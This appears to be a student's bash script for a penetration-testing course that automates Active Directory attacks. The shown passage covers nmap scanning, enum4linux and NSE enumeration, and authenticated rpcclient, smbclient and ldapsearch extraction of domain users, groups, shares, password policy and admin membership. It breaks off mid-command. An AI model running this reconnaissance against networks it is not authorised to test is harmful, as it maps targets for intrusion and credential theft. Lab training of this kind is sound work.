#!/usr/bin/env bash
###############################################################################
# Operation Domain Mapper (ZX305)
# Author: [yonatan avitan]
# Student ID: s20
# Description: Automated domain reconnaissance & exploitation framework.
# Course Code: 7736-39
# Lecturer: [ Tzach Azoulis]
# Tools used: Nmap, enum4linux, smbclient, rpcclient, netexec/hydra, impacket, john.
###############################################################################

# -----------------------------------------------------------------------------
# 1. STRICT MODE & GLOBALS
# -----------------------------------------------------------------------------
set -eo pipefail

export PYTHONWARNINGS="ignore"
export PIP_DISABLE_PIP_VERSION_CHECK=1
export DEBIAN_FRONTEND=noninteractive

if [ "$EUID" -ne 0 ]; then
    echo "[!] This script must be executed as root. Use: sudo $0"
    exit 1
fi

C_RESET='\033[0m'
C_RED='\033[1;31m'
C_GREEN='\033[1;32m'
C_YELLOW='\033[1;33m'
C_BLUE='\033[1;34m'
C_MAGENTA='\033[1;35m'
C_CYAN='\033[1;36m'
C_BOLD='\033[1m'

STUDENT_ID="ZX305"
WORK_DIR="/tmp/zx305_work"
REPORT_HTML="${WORK_DIR}/${STUDENT_ID}_report.html"
REPORT_PDF="$(pwd)/7736-39.S20.zx305_$(date +%Y%m%d_%H%M%S).pdf"
EXIT_CODE=0

TARGET_NET=""
DOMAIN=""
AD_USER=""
AD_PASS=""
PASS_LIST=""
SCAN_LEVEL=0
ENUM_LEVEL=0
EXPLOIT_LEVEL=0
DC_IP=""
DHCP_IP=""
OPEN_PORTS=""
LIVE_HOSTS=""

mkdir -p "$WORK_DIR"
NMAP_BASIC="${WORK_DIR}/nmap_basic"
NMAP_FULL="${WORK_DIR}/nmap_full"
NMAP_UDP="${WORK_DIR}/nmap_udp"
NMAP_SVC="${WORK_DIR}/nmap_service"
NMAP_NSE="${WORK_DIR}/nmap_nse"
NMAP_VULN="${WORK_DIR}/nmap_vuln"
ENUM4LX_OUT="${WORK_DIR}/enum4linux.txt"
USERS_FILE="${WORK_DIR}/users.txt"
USERS_FILE_CLEAN="${WORK_DIR}/users_clean.txt"
GROUPS_FILE="${WORK_DIR}/groups.txt"
SHARES_FILE="${WORK_DIR}/shares.txt"
PWPOL_FILE="${WORK_DIR}/pwpolicy.txt"
DA_FILE="${WORK_DIR}/domain_admins.txt"
DISABLED_FILE="${WORK_DIR}/disabled.txt"
NEVEREXP_FILE="${WORK_DIR}/never_expire.txt"
ASREP_HASH="${WORK_DIR}/asrep.hash"
KERB_HASH="${WORK_DIR}/kerberoast.hash"
SPRAY_OUT="${WORK_DIR}/spray.txt"
SPRAY_PWLIST="${WORK_DIR}/spray_pw.txt"
DHCP_OUT="${WORK_DIR}/dhcp.txt"
JOHN_OUT="${WORK_DIR}/john_results.txt"

TEMP_FILES=( "$NMAP_BASIC" "$NMAP_FULL" "$NMAP_UDP" "$NMAP_SVC" "$NMAP_NSE" "$NMAP_VULN"
             "$ENUM4LX_OUT" "$USERS_FILE" "$USERS_FILE_CLEAN" "$GROUPS_FILE" "$SHARES_FILE"
             "$PWPOL_FILE" "$DA_FILE" "$DISABLED_FILE" "$NEVEREXP_FILE"
             "$ASREP_HASH" "$KERB_HASH" "$SPRAY_OUT" "$SPRAY_PWLIST"
             "$DHCP_OUT" "$JOHN_OUT" "$REPORT_HTML" )

# -----------------------------------------------------------------------------
# 2. CLEANUP TRAP — secure removal of all temp artifacts
# -----------------------------------------------------------------------------
cleanup() {
    trap - EXIT INT TERM
    
    kill -9 $(jobs -p) 2>/dev/null || true
    pkill -9 -P $$ 2>/dev/null || true
    pkill -9 -f "nmap|netexec|nxc|crackmapexec|enum4linux|impacket|smbclient|rpcclient|hydra|john|ldapsearch" 2>/dev/null || true
    echo -e "\n${C_YELLOW}[*] Cleaning temporary artifacts...${C_RESET}"
    for f in "${TEMP_FILES[@]}"; do
        [ -e "$f" ] && rm -f "$f" 2>/dev/null
        rm -f "${f}.nmap" "${f}.gnmap" "${f}.xml" 2>/dev/null
    done
    if [ -d "$WORK_DIR" ]; then
        find "$WORK_DIR" -type f \( -name "*.html" -o -name "*.gnmap" \
            -o -name "*.txt" -o -name "*.hash" -o -name "*.xml" \
            -o -name "*.nmap" \) -exec rm -f {} \; 2>/dev/null
        rmdir "$WORK_DIR" 2>/dev/null || true
    fi
    echo -e "${C_GREEN}[+] Cleanup complete. Only ${STUDENT_ID}.sh and ${STUDENT_ID}.pdf remain.${C_RESET}"
    exit "$EXIT_CODE"
}
trap cleanup EXIT INT TERM

# -----------------------------------------------------------------------------
# 3. SAFE LOGGING & REPORTING UTILITIES
# -----------------------------------------------------------------------------
strip_ansi() { sed -E 's/\x1b\[[0-9;:]*[a-zA-Z]//g'; }

log_msg()   { echo -e "${C_GREEN}[+]${C_RESET} $1"; }
log_info()  { echo -e "${C_CYAN}[*]${C_RESET} $1"; }
log_warn()  { echo -e "${C_YELLOW}[!]${C_RESET} $1"; }
log_err()   { echo -e "${C_RED}[X]${C_RESET} $1" >&2; }

log_stage() {
    echo -e "\n${C_MAGENTA}${C_BOLD}========================================================${C_RESET}"
    echo -e "${C_MAGENTA}${C_BOLD}  STAGE: $1${C_RESET}"
    echo -e "${C_MAGENTA}${C_BOLD}========================================================${C_RESET}\n"
}

init_report() {
    cat > "$REPORT_HTML" <<EOF
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>${s20} - Operation Domain Mapper Report</title>
<style>
body{font-family:Arial,Helvetica,sans-serif;margin:25px;color:#222;}
h1{color:#1a237e;border-bottom:3px solid #1a237e;padding-bottom:6px;}
h2{color:#283593;margin-top:30px;border-bottom:1px solid #888;}
h3{color:#3949ab;}
pre{background:#0d1117;color:#d1d5da;padding:12px;border-radius:6px;
    overflow-x:auto;font-size:12px;white-space:pre-wrap;word-wrap:break-word;}
.meta{background:#eef;padding:10px;border-left:4px solid #1a237e;margin-bottom:20px;}
.skip{color:#b71c1c;font-style:italic;}
.note{background:#fffde7;border-left:4px solid #fbc02d;padding:8px;margin:10px 0;}
.exec{background:#e8f5e9;border-left:4px solid #2e7d32;padding:8px;margin:10px 0;font-weight:bold;}
</style></head><body>
<h1>Operation Domain Mapper - Report (${s20})</h1>
<div class="meta">
<b>Generated:</b> $(date)<br>
<b>Target Network:</b> ${TARGET_NET}<br>
<b>Domain:</b> ${DOMAIN}<br>
<b>AD User:</b> ${AD_USER:-<i>(null session)</i>}<br>
<b>Levels:</b> Scan=${SCAN_LEVEL} | Enum=${ENUM_LEVEL} | Exploit=${EXPLOIT_LEVEL}
</div>
EOF
}

report_section()    { echo "<h2>$1</h2>" >> "$REPORT_HTML"; }
report_subsection() { echo "<h3>$1</h3>" >> "$REPORT_HTML"; }
report_skip()       { echo "<p class=\"skip\">[SKIPPED] $1</p>" >> "$REPORT_HTML"; }
report_note()       { echo "<div class=\"note\">$1</div>" >> "$REPORT_HTML"; }
report_exec()       { echo "<div class=\"exec\">$1</div>" >> "$REPORT_HTML"; }

append_tool_output() {
    local title="$1"; local file="$2"
    echo "<h3>${title}</h3><pre><code>" >> "$REPORT_HTML"
    if [ -s "$file" ]; then
        strip_ansi < "$file" \
            | sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' -e 's/>/\&gt;/g' \
            >> "$REPORT_HTML"
        # Live display: stream raw output to user's console for real-time visibility
        echo -e "\n${C_CYAN}[RAW OUTPUT: ${title}]${C_RESET}"
        cat "$file"
        echo -e "${C_CYAN}[END OUTPUT]${C_RESET}\n"
    else
        echo "(no output captured)" >> "$REPORT_HTML"
        echo -e "${C_YELLOW}[RAW OUTPUT: ${title}] (no output captured)${C_RESET}"
    fi
    echo "</code></pre>" >> "$REPORT_HTML"
}

append_inline() {
    local title="$1"; local content="$2"
    echo "<h3>${title}</h3><pre><code>" >> "$REPORT_HTML"
    printf '%s' "$content" | strip_ansi \
        | sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' -e 's/>/\&gt;/g' \
        >> "$REPORT_HTML"
    echo "</code></pre>" >> "$REPORT_HTML"
}


generate_report() {
    echo "</body></html>" >> "$REPORT_HTML"
    log_info "Converting HTML report to PDF via Chromium headless: ${REPORT_PDF}"

    local browser=""
    for cand in chromium chromium-browser google-chrome chrome; do
        if command -v "$cand" >/dev/null 2>&1; then
            browser="$cand"; break
        fi
    done

    if [ -z "$browser" ]; then
        log_err "Chromium not installed. PDF conversion failed. The raw HTML report is available at $REPORT_HTML."
        TEMP_FILES=( "${TEMP_FILES[@]/$REPORT_HTML}" )
        return 0
    fi

    "$browser" --headless --no-sandbox --disable-gpu \
        --print-to-pdf="$REPORT_PDF" "file://$REPORT_HTML" >/dev/null 2>&1 || \
        log_err "PDF conversion failed. Raw HTML is at $REPORT_HTML"

    if [ -s "$REPORT_PDF" ]; then
        log_msg "PDF report generated: ${REPORT_PDF}"
    else
        log_err "PDF conversion failed. The raw HTML report is available at $REPORT_HTML."
        TEMP_FILES=( "${TEMP_FILES[@]/$REPORT_HTML}" )
    fi
}

# -----------------------------------------------------------------------------
# 4. PHASE 1 — PREREQUISITES (auto-install, no warnings)
# -----------------------------------------------------------------------------
check_prerequisites() {
    log_stage "PHASE 1: Verifying & Installing Prerequisites"

    # NOTE: hashcat is BANNED (no GPU on lab VM). Use john only.
    declare -A TOOL_PKG=(
        [nmap]="nmap"
        [smbclient]="smbclient"
        [rpcclient]="samba-common-bin"
        [ldapsearch]="ldap-utils"
        [hydra]="hydra"
        [chromium]="chromium"
        [enum4linux]="enum4linux"
        [john]="john"
        [nxc]="netexec"
        [impacket-GetNPUsers]="impacket-scripts"
        [impacket-GetUserSPNs]="impacket-scripts"
        [nbtscan]="nbtscan"
    )

    local missing_pkgs=()
    for tool in "${!TOOL_PKG[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            log_warn "Missing tool: $tool  -> queuing package: ${TOOL_PKG[$tool]}"
            missing_pkgs+=( "${TOOL_PKG[$tool]}" )
        fi
    done

    if ! command -v nxc >/dev/null 2>&1 && ! command -v crackmapexec >/dev/null 2>&1; then
        missing_pkgs+=( "crackmapexec" )
    fi

    log_info "Refreshing apt index..."
    apt-get update -y >/dev/null 2>&1 || true

    # FIX 1 (prereq): explicit chromium install with --fix-missing for Kali 2025.3 resilience
    apt-get install -y --fix-missing chromium >/dev/null 2>&1 || true

    if [ ${#missing_pkgs[@]} -gt 0 ]; then
        log_info "Installing missing packages silently (this may take a moment)..."
        local uniq_pkgs
        uniq_pkgs=$(printf "%s\n" "${missing_pkgs[@]}" | sort -u | tr '\n' ' ')
        # shellcheck disable=SC2086
        apt-get install -y $uniq_pkgs >/dev/null 2>&1 || \
            log_warn "Some packages may have failed to install. Continuing."
    else
        log_msg "All required tools are present."
    fi

    if [ -f /usr/share/wordlists/rockyou.txt.gz ] && \
       [ ! -f /usr/share/wordlists/rockyou.txt ]; then
        log_info "Decompressing rockyou.txt.gz ..."
        gunzip -k /usr/share/wordlists/rockyou.txt.gz >/dev/null 2>&1 || true
    fi

    log_msg "Prerequisite check complete."
}

# -----------------------------------------------------------------------------
# 5. PHASE 2 — USER INPUT
# -----------------------------------------------------------------------------
validate_cidr() {
    local cidr="$1"
    [[ "$cidr" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$ ]] || return 1
    local ip="${cidr%/*}"; local mask="${cidr#*/}"
    [ "$mask" -ge 0 ] && [ "$mask" -le 32 ] || return 1
    IFS='.' read -r a b c d <<<"$ip"
    for o in "$a" "$b" "$c" "$d"; do
        [ "$o" -ge 0 ] && [ "$o" -le 255 ] || return 1
    done
    return 0
}

validate_domain() {
    [[ -n "$1" && "$1" =~ ^[A-Za-z0-9]([A-Za-z0-9.\-]*[A-Za-z0-9])?$ ]]
}

print_level_menu() {
    echo -e "  ${C_BOLD}0)${C_RESET} None         - Skip this mode" >&2
    echo -e "  ${C_BOLD}1)${C_RESET} Basic        - Lightweight reconnaissance" >&2
    echo -e "  ${C_BOLD}2)${C_RESET} Intermediate - Deeper scans" >&2
    echo -e "  ${C_BOLD}3)${C_RESET} Advanced     - Full attack surface" >&2
}

prompt_level() {
    local mode="$1"; local choice
    while true; do
        echo -e "\n${C_CYAN}>> Select level for [${mode}] mode:${C_RESET}" >&2
        print_level_menu
        read -rp "  Choice [0-3]: " choice
        if [[ "$choice" =~ ^[0-3]$ ]]; then
            echo "$choice"
            return 0
        fi
        echo -e "${C_RED}[X]${C_RESET} Invalid selection. Enter 0, 1, 2, or 3." >&2
    done
}

get_user_input() {
    log_stage "PHASE 2: Configuration Wizard"
    echo -e "${C_BOLD}Welcome to Operation Domain Mapper (${STUDENT_ID}).${C_RESET}"
    echo -e "All inputs are validated. After this wizard, the script runs unattended.\n"

    while true; do
        read -rp "$(echo -e ${C_CYAN}'>> Target network (CIDR, e.g., 10.0.0.0/24): '${C_RESET})" TARGET_NET
        # ISSUE 8: Smart bare-IP autodetect — `.0` => /24 (network attempt), other => /32 (single host).
        if [[ "$TARGET_NET" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            local detected_prefix=""
            detected_prefix=$(ip -o addr show 2>/dev/null \
                | awk -v ip="$TARGET_NET" '$0 ~ ip {split($4,a,"/"); print a[2]; exit}')
            if [ -n "$detected_prefix" ]; then
                TARGET_NET="${TARGET_NET}/${detected_prefix}"
                log_msg "Auto-detected prefix from local interface: $TARGET_NET"
            elif [[ "$TARGET_NET" == *.0 ]]; then
                TARGET_NET="${TARGET_NET}/24"
                log_warn "Network address detected. Auto-formatted to: $TARGET_NET"
            else
                TARGET_NET="${TARGET_NET}/24"
                log_warn "No interface match. Defaulting to /24: $TARGET_NET"
            fi
        fi
        validate_cidr "$TARGET_NET" && { log_msg "Target accepted: $TARGET_NET"; break; }
        log_err "Invalid CIDR. Format: A.B.C.D/MASK (bare A.B.C.0 => /24, bare A.B.C.X => /32)"
    done

    while true; do
        read -rp "$(echo -e ${C_CYAN}'>> Domain name (e.g., corp.local): '${C_RESET})" DOMAIN
        validate_domain "$DOMAIN" && { log_msg "Domain accepted: $DOMAIN"; break; }
        log_err "Invalid domain. Must contain a dot (e.g., corp.local)."
    done

    read -rp "$(echo -e ${C_CYAN}'>> AD Username (leave blank for null session): '${C_RESET})" AD_USER
    if [ -n "$AD_USER" ]; then
        read -rsp "$(echo -e ${C_CYAN}'>> AD Password: '${C_RESET})" AD_PASS
        echo
        log_msg "AD credentials captured for user: $AD_USER"
    else
        AD_USER=""; AD_PASS=""
        log_warn "No AD credentials. Tools will be forced into null session (-N / -U \"%\")."
    fi

    read -rp "$(echo -e ${C_CYAN}'>> Password list path [default: /usr/share/wordlists/rockyou.txt]: '${C_RESET})" PASS_LIST
    PASS_LIST="${PASS_LIST:-/usr/share/wordlists/rockyou.txt}"
    if [ ! -f "$PASS_LIST" ]; then
        log_warn "Password list not found at $PASS_LIST. Falling back to /usr/share/wordlists/rockyou.txt"
        PASS_LIST="/usr/share/wordlists/rockyou.txt"
    fi
    log_msg "Using password list: $PASS_LIST"

    echo -e "\n${C_BOLD}Note:${C_RESET} Each mode is configured independently."
    SCAN_LEVEL=$(prompt_level "Scanning")
    ENUM_LEVEL=$(prompt_level "Enumeration")
    EXPLOIT_LEVEL=$(prompt_level "Exploitation")

    echo
    log_msg "Configuration complete:"
    echo -e "    Target : ${C_BOLD}$TARGET_NET${C_RESET}"
    echo -e "    Domain : ${C_BOLD}$DOMAIN${C_RESET}"
    echo -e "    AD User: ${C_BOLD}${AD_USER:-<null session>}${C_RESET}"
    echo -e "    Levels : Scan=$SCAN_LEVEL  Enum=$ENUM_LEVEL  Exploit=$EXPLOIT_LEVEL"
}

# -----------------------------------------------------------------------------
# 6. HELP MENU
# -----------------------------------------------------------------------------
show_help() {
    cat <<EOF
${s20} - Operation Domain Mapper

USAGE:
  sudo ./${s20}.sh           Launch the interactive wizard.
  sudo ./${s20}.sh -h|--help Show this help menu.

DESCRIPTION:
  Automated AD/domain reconnaissance, enumeration, and exploitation toolkit.
  Produces a single PDF report named ${s20}.pdf in the working directory.

CONFIGURATION (collected via wizard):
  - Target network range  (CIDR, e.g., 10.0.0.0/24)
  - Domain name           (e.g., corp.local)
  - AD credentials        (optional; blank => null session / anonymous)
  - Password list         (default: /usr/share/wordlists/rockyou.txt)
  - Operation level (0-3) per mode: Scanning, Enumeration, Exploitation

OPERATION LEVELS:
  0 None         - skip the mode entirely
  1 Basic
  2 Intermediate
  3 Advanced

NOTES:
  - Requires root privileges.
  - Hashcat is NOT used (lab VM has no GPU). All cracking uses 'john'.
  - All temp files are securely removed on exit.
  - Final output: ${s20}.pdf

EOF
}

# -----------------------------------------------------------------------------
# Helpers used by Enum/Exploit modules
# -----------------------------------------------------------------------------

# Extract a comma-separated list of unique TCP open ports from saved nmap output.
extract_open_ports() {
    local src="$NMAP_FULL"
    [ ! -s "$src" ] && src="$NMAP_BASIC"
    [ ! -s "$src" ] && { echo ""; return 0; }
    grep -E '^[0-9]+/tcp\s+open' "$src" 2>/dev/null \
        | awk -F'/' '{print $1}' | sort -un | paste -sd, -
}

# Extract a list of live hosts from saved nmap output (uses .gnmap if present).
extract_live_hosts() {
    local g="${NMAP_FULL}.gnmap"
    [ ! -s "$g" ] && g="${NMAP_BASIC}.gnmap"
    [ ! -s "$g" ] && { echo ""; return 0; }
    awk '/Status: Up/{print $2}' "$g" 2>/dev/null | sort -u | paste -sd' ' -
}

# Locate the Domain Controller via Kerberos (88) / LDAP (389).
find_dc_ip() {
    local hosts="${NMAP_FULL}.gnmap"
    [ ! -s "$hosts" ] && hosts="${NMAP_BASIC}.gnmap"
    [ ! -s "$hosts" ] && hosts="${NMAP_SVC}.gnmap"
    if [ -s "$hosts" ]; then
        DC_IP=$(awk '/Ports:/ && /88\/open/ {print $2; exit}' "$hosts" 2>/dev/null)
        [ -z "$DC_IP" ] && DC_IP=$(awk '/Ports:/ && /389\/open/ {print $2; exit}' "$hosts" 2>/dev/null)
    fi
    if [ -z "$DC_IP" ]; then
        # Direct probe (fast, single port)
        local probe="${WORK_DIR}/dc_probe"
        nmap -Pn -p 88 --open -T4 -oG "${probe}.gnmap" "$TARGET_NET" >/dev/null 2>&1 || true
        DC_IP=$(awk '/Ports:/ && /88\/open/ {print $2; exit}' "${probe}.gnmap" 2>/dev/null)
        rm -f "${probe}.gnmap" 2>/dev/null
    fi
    echo "$DC_IP"
}

# DHCP discovery via nmap broadcast script (timeout protected).
find_dhcp_ip() {
    touch "$DHCP_OUT"
    timeout 20 nmap -sU -p 67 --script=dhcp-discover "$TARGET_NET" -oN "$DHCP_OUT" >/dev/null 2>&1 || true
    DHCP_IP=$(grep -E 'Server Identifier' "$DHCP_OUT" 2>/dev/null | awk '{print $NF}' | head -1)
    if [ -z "$DHCP_IP" ]; then
        DHCP_IP=$(ip route | grep default | awk '{print $3}' | head -1)
    fi
    echo "$DHCP_IP"
}

# Provide a fallback user list if enumeration produced nothing (per .clinerules).
ensure_users_file() {
    touch "$USERS_FILE_CLEAN"
    if [ ! -s "$USERS_FILE_CLEAN" ]; then
        printf "Administrator\nGuest\nadmin\n" > "$USERS_FILE_CLEAN"
        log_warn "USERS_FILE_CLEAN was empty; using fallback list (Administrator, Guest, admin)."
    fi
}

# -----------------------------------------------------------------------------
# 7. PHASE 3 — SCANNING MODULE
#   Each higher level encompasses the capabilities of the previous (per project spec).
# -----------------------------------------------------------------------------
run_scanning_module() {
    if [ "$SCAN_LEVEL" -eq 0 ]; then
        log_warn "Scanning level = 0 (None). Skipping scanning module."
        report_section "Phase 3: Scanning"
        report_skip "Scanning was skipped (level 0)."
        return 0
    fi

    log_stage "PHASE 3: Scanning  (Level ${SCAN_LEVEL})"
    report_section "Phase 3: Scanning  (Level ${SCAN_LEVEL})"

    case "$SCAN_LEVEL" in
        1)
            log_info "Executing Level 1 (Basic TCP Scan)"
            report_exec "Executing Level 1 (Basic TCP Scan): nmap -Pn"
            nmap -Pn -T4 -oN "$NMAP_BASIC" -oG "${NMAP_BASIC}.gnmap" "$TARGET_NET" \
                >/dev/null 2>&1 || log_warn "Basic nmap returned non-zero status."
            append_tool_output "Nmap -Pn results" "$NMAP_BASIC"
            ;;
        2)
            log_info "Executing Level 2 (Full TCP Scan)"
            report_exec "Executing Level 2 (Full TCP Scan): nmap -p- (all 65535 TCP ports)"
            nmap -Pn -p- -T4 --min-rate 1000 -oN "$NMAP_FULL" -oG "${NMAP_FULL}.gnmap" "$TARGET_NET" \
                >/dev/null 2>&1 || log_warn "Full TCP nmap returned non-zero status."
            append_tool_output "Nmap -p- results (all 65535 TCP ports)" "$NMAP_FULL"
            ;;
        3)
            log_info "Executing Level 3 (Full TCP + Top 100 UDP Scan)"
            report_exec "Executing Level 3 (Full TCP + Top 100 UDP Scan)"
            # Full TCP
            nmap -Pn -p- -T4 --min-rate 1000 -oN "$NMAP_FULL" -oG "${NMAP_FULL}.gnmap" "$TARGET_NET" \
                >/dev/null 2>&1 || log_warn "Full TCP nmap returned non-zero status."
            append_tool_output "Nmap -p- results (all 65535 TCP ports)" "$NMAP_FULL"
            # MANDATORY hardened UDP — never raw -sU on a subnet
            report_note "UDP constrained to top 100 ports with -T4 --max-retries 1 --min-rate 500 (per .clinerules) to prevent VM hangs."
            nmap -sU --top-ports 100 -T4 --max-retries 1 --min-rate 500 \
                -oN "$NMAP_UDP" "$TARGET_NET" >/dev/null 2>&1 || \
                log_warn "UDP nmap returned non-zero status."
            append_tool_output "Nmap UDP top-100 results" "$NMAP_UDP"
            ;;
    esac

    log_msg "Scanning module finished."
}

# -----------------------------------------------------------------------------
# 8. PHASE 4 — ENUMERATION MODULE
# -----------------------------------------------------------------------------
run_enumeration_module() {
    if [ "$ENUM_LEVEL" -eq 0 ]; then
        log_warn "Enumeration level = 0 (None). Skipping enumeration module."
        report_section "Phase 4: Enumeration"
        report_skip "Enumeration was skipped (level 0)."
        return 0
    fi

    log_stage "PHASE 4: Enumeration  (Level ${ENUM_LEVEL} — cumulative)"
    report_section "Phase 4: Enumeration  (Level ${ENUM_LEVEL} — cumulative)"

    OPEN_PORTS=$(extract_open_ports)
    LIVE_HOSTS=$(extract_live_hosts)
    [ -z "$OPEN_PORTS" ] && OPEN_PORTS="21,22,53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,5985"
    log_info "Enumeration ports: $OPEN_PORTS"

    # ------------------ LEVEL 1 (Basic) — always runs when ENUM_LEVEL >= 1 ------------------
    if [ "$ENUM_LEVEL" -ge 1 ]; then
        log_info "Executing Level 1 (Service Identification + DC/DHCP Discovery)"
        report_exec "Executing Level 1 (Service Identification + DC/DHCP Discovery)"

        # 3.1.1 Identify services (-sV) on the top 1000 ports for speed
        nmap -Pn -sV --top-ports 1000 -T4 -oN "$NMAP_SVC" -oG "${NMAP_SVC}.gnmap" "$TARGET_NET" \
            >/dev/null 2>&1 || log_warn "Service scan returned non-zero status."
        append_tool_output "Nmap -sV --top-ports 1000 (service identification)" "$NMAP_SVC"

        # 3.1.2 Domain Controller discovery
        DC_IP=$(find_dc_ip)
        if [ -n "$DC_IP" ]; then
            log_msg "Domain Controller located: $DC_IP"
            append_inline "Domain Controller IP" "$DC_IP"
        else
            log_warn "Domain Controller not located via Kerberos/LDAP."
            report_skip "Domain Controller IP could not be determined."
        fi

        # 3.1.3 DHCP server discovery
        DHCP_IP=$(find_dhcp_ip)
        if [ -n "$DHCP_IP" ]; then
            log_msg "DHCP server located: $DHCP_IP"
            append_inline "DHCP Server IP" "$DHCP_IP"
            echo -e "${C_CYAN}[RAW OUTPUT: DHCP Server IP]${C_RESET}\n$DHCP_IP\n${C_CYAN}[END OUTPUT]${C_RESET}"
        else
            log_warn "DHCP server not located via broadcast."
            report_skip "DHCP server IP could not be determined."
        fi
    fi

    # ------------------ LEVEL 2 (Intermediate) — cascades on top of L1 ------------------
    if [ "$ENUM_LEVEL" -ge 2 ]; then
        log_info "Executing Level 2 (Key Services + enum4linux + 3 NSE Scripts)"
        report_exec "Executing Level 2 (Key-Service Enumeration + enum4linux + NSE Scripts)"

        # 3.2.1 Enumerate IPs running key services: FTP/SSH/SMB/WinRM/LDAP/RDP
        local key_ports="21,22,389,445,3389,5985"
        local keyout="${WORK_DIR}/nmap_keysvc"
        nmap -Pn -sV -p "$key_ports" -T4 -oN "$keyout" "$TARGET_NET" \
            >/dev/null 2>&1 || log_warn "Key-services scan returned non-zero status."
        append_tool_output "Key services (FTP/SSH/SMB/WinRM/LDAP/RDP)" "$keyout"
        rm -f "$keyout" 2>/dev/null

        # 3.2.2 Enumerate shared folders via enum4linux (requires single host, not CIDR)
        [ -z "$DC_IP" ] && DC_IP=$(find_dc_ip)
        touch "$ENUM4LX_OUT"
        if [ -z "$DC_IP" ]; then
            log_warn "enum4linux skipped: DC IP could not be located (enum4linux requires a single host)."
            report_skip "enum4linux skipped: DC IP not located. enum4linux cannot accept CIDR input."
        else
            log_info "enum4linux targeting DC: $DC_IP"
            local e4l_creds
            if [ -z "$AD_USER" ]; then
                e4l_creds=( -a -u "" -p "" )
                report_note "enum4linux running with null session (no AD credentials) against <code>${DC_IP}</code>."
            else
                e4l_creds=( -a -u "$AD_USER" -p "$AD_PASS" -w "$DOMAIN" )
                report_note "enum4linux running authenticated as <code>${AD_USER}</code> against <code>${DC_IP}</code>."
            fi
            timeout 5m enum4linux "${e4l_creds[@]}" "$DC_IP" >"$ENUM4LX_OUT" 2>&1 || \
                log_warn "enum4linux returned non-zero status."
            append_tool_output "enum4linux (shares & domain info)" "$ENUM4LX_OUT"
        fi

        # 3.2.3 Three NSE scripts for domain enumeration
        report_note "<b>NSE Justification:</b> <i>ldap-rootdse</i> reveals the domain naming context and forest info without credentials. <i>smb-os-discovery</i> identifies host OS, NetBIOS, and domain membership over SMB. <i>smb-enum-shares</i> lists exposed shares (read/write permissions) to surface lateral-movement targets."
        nmap -Pn -p 389,445 \
            --script "ldap-rootdse,smb-os-discovery,smb-enum-shares" \
            -T4 -oN "$NMAP_NSE" "$TARGET_NET" \
            >/dev/null 2>&1 || log_warn "NSE script scan returned non-zero status."
        append_tool_output "NSE: ldap-rootdse, smb-os-discovery, smb-enum-shares" "$NMAP_NSE"
    fi

    # ------------------ LEVEL 3 (Advanced) — cascades on top of L1 + L2 ------------------
    if [ "$ENUM_LEVEL" -ge 3 ]; then
        log_info "Executing Level 3 (Authenticated AD/LDAP Extraction)"
        report_exec "Executing Level 3 (Authenticated AD/LDAP Extraction)"

        if [ -z "$AD_USER" ]; then
            log_warn "AD credentials not provided. Skipping Level 3 (cannot authenticate)."
            report_skip "Level 3 (AD/LDAP extraction) requires credentials. \$AD_USER was empty."
        else
            [ -z "$DC_IP" ] && DC_IP=$(find_dc_ip)
            if [ -z "$DC_IP" ]; then
                log_warn "Could not locate DC. Aborting Level 3 enumeration."
                report_skip "DC IP not located; LDAP/RPC extraction aborted."
            else
                log_msg "Using DC: $DC_IP"
                append_inline "Domain Controller IP" "$DC_IP"

                local cred="${DOMAIN}\\${AD_USER}%${AD_PASS}"

                # 3.3.1 Extract all users
                touch "$USERS_FILE"
                rpcclient -U "$cred" "$DC_IP" -c "enumdomusers" \
                    > "$USERS_FILE" 2>&1 || log_warn "rpcclient enumdomusers failed."
                append_tool_output "Domain Users (rpcclient enumdomusers)" "$USERS_FILE"
                grep -oE 'user:\[[^]]+\]' "$USERS_FILE" 2>/dev/null \
                    | sed -E 's/user:\[(.+)\]/\1/' | sort -u > "$USERS_FILE_CLEAN" || true
                log_msg "Extracted $(wc -l < "$USERS_FILE_CLEAN" 2>/dev/null || echo 0) users -> $USERS_FILE_CLEAN"

                # 3.3.2 Extract all groups
                touch "$GROUPS_FILE"
                rpcclient -U "$cred" "$DC_IP" -c "enumdomgroups" \
                    > "$GROUPS_FILE" 2>&1 || log_warn "rpcclient enumdomgroups failed."
                append_tool_output "Domain Groups (rpcclient enumdomgroups)" "$GROUPS_FILE"

                # 3.3.3 Extract all shares
                touch "$SHARES_FILE"
                if [ -z "$AD_USER" ]; then
                    smbclient -L "//$DC_IP" -N \
                        > "$SHARES_FILE" 2>/dev/null || true
                else
                    smbclient -L "//$DC_IP" -U "$DOMAIN\\$AD_USER%$AD_PASS" \
                        > "$SHARES_FILE" 2>/dev/null || true
                fi
                append_tool_output "Shares (smbclient -L)" "$SHARES_FILE"

                # 3.3.4 Display password policy
                touch "$PWPOL_FILE"
                rpcclient -U "$cred" "$DC_IP" -c "getdompwinfo" \
                    > "$PWPOL_FILE" 2>&1 || log_warn "rpcclient getdompwinfo failed."
                append_tool_output "Password Policy (rpcclient getdompwinfo)" "$PWPOL_FILE"

                # 3.3.5 Disabled accounts (LDAP UAC bit 0x2)
                touch "$DISABLED_FILE"
                ldapsearch -x -H "ldap://${DC_IP}" -D "${AD_USER}@${DOMAIN}" -w "$AD_PASS" \
                    -b "dc=${DOMAIN//./,dc=}" \
                    "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" \
                    sAMAccountName \
                    > "$DISABLED_FILE" 2>&1 || log_warn "ldapsearch (disabled) failed."
                append_tool_output "Disabled Accounts (LDAP UAC=0x2)" "$DISABLED_FILE"

                # 3.3.6 Never-expire accounts (LDAP UAC bit 0x10000)
                touch "$NEVEREXP_FILE"
                ldapsearch -x -H "ldap://${DC_IP}" -D "${AD_USER}@${DOMAIN}" -w "$AD_PASS" \
                    -b "dc=${DOMAIN//./,dc=}" \
                    "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" \
                    sAMAccountName \
                    > "$NEVEREXP_FILE" 2>&1 || log_warn "ldapsearch (never-expire) failed."
                append_tool_output "Never-Expire Accounts (LDAP UAC=0x10000)" "$NEVEREXP_FILE"

                # 3.3.7 Domain Admins membership
                touch "$DA_FILE"
                net rpc group members "Domain Admins" -U "${AD_USER}%${AD_PASS}" \
